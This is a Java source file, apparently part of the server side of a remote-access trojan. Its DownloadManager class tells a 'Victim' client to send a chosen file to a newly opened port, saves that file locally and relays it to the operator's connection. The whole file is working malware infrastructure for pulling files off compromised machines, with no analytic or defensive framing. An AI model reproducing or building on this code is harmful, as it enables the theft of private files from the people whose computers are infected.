import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class DownloadManager extends Thread {

    private ServerSocket serverSocket;
    private Socket sourceSocket;
    private Socket targetSocket;
    private InputStream inputStream;
    private OutputStream outputStream;
    private FileInputStream fileInputStream;
    private FileOutputStream fileOutputStream;

    private User user;
    private Victim victim;
    private String path;
    private String filename;

    public DownloadManager(User user, Victim victim, String path) {
        this.user = user;
        this.victim = victim;
        this.path = path;

        String[] params = path.split("/");
        this.filename = params[params.length - 1];
    }

    @Override
    public void run() {
        try {
            int port = findFreePort();
            serverSocket = new ServerSocket(port);
            victim.sendDownloadFile(path, port, user.getLogin());

            sourceSocket = serverSocket.accept();
            inputStream = sourceSocket.getInputStream();
            fileOutputStream = new FileOutputStream(Config.DOWNLOAD_PATH + filename);
            byte[] bytes = new byte[8*1024];
            int len;
            while ((len = inputStream.read(bytes)) != -1) {
                fileOutputStream.write(bytes, 0, len);
            }

            targetSocket = serverSocket.accept();
            outputStream = targetSocket.getOutputStream();
            fileInputStream = new FileInputStream(Config.DOWNLOAD_PATH + filename);
            while ((len = fileInputStream.read(bytes)) != -1) {
                outputStream.write(bytes, 0, len);
            }

            dispose();
        } catch (IOException e) {
            e.printStackTrace();
            dispose();
        }
    }

    public void dispose() {
        try {
            inputStream.close();
            outputStream.close();
            fileInputStream.close();
            fileOutputStream.close();
            sourceSocket.close();
            targetSocket.close();
            serverSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        interrupt();
    }

    private int findFreePort() {
        int port = 1000;
        while (true) {
            if (!isListeningServer("localhost", port)) break;
            port++;
        }
        return port;
    }

    private boolean isListeningServer(String host, int port)
    {
        Socket s = null;
        try
        {
            s = new Socket(host, port);
            return true;
        }
        catch (Exception e)
        {
            return false;
        }
        finally
        {
            if(s != null)
                try {s.close();}
                catch(Exception e){}
        }
    }
}
